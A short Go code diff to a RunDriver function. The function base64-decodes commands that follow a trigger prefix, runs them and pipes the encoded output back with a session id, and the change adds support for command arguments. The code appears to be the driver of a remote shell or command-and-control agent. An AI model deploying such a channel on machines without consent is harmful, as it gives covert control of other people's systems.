@@ -21,11 +21,17 @@ func RunDriver() {
 				message := strings.TrimSuffix(strings.TrimPrefix(line, sharedConstants.TriggerCommandCommand), "\n")
 				sessionMessage := strings.SplitN(message, " ", 2)
 				decode, _ := b64.StdEncoding.DecodeString(sessionMessage[1])
+				cmd := strings.SplitN(string(decode), " ", -1)
 
-				userCommand := exec.Command(string(decode))
-				output, _ := userCommand.CombinedOutput()
-
-				commandOutPipe.WriteString(sessionMessage[0] + " " + b64.StdEncoding.EncodeToString(output) + "\n")
+				if len(cmd) == 1 {
+					userCommand := exec.Command(cmd[0])
+					output, _ := userCommand.CombinedOutput()
+					commandOutPipe.WriteString(sessionMessage[0] + " " + b64.StdEncoding.EncodeToString(output) + "\n")
+				} else {
+					userCommand := exec.Command(cmd[0], cmd[1:]...)
+					output, _ := userCommand.CombinedOutput()
+					commandOutPipe.WriteString(sessionMessage[0] + " " + b64.StdEncoding.EncodeToString(output) + "\n")
+				}
 			}
 		}
 	}
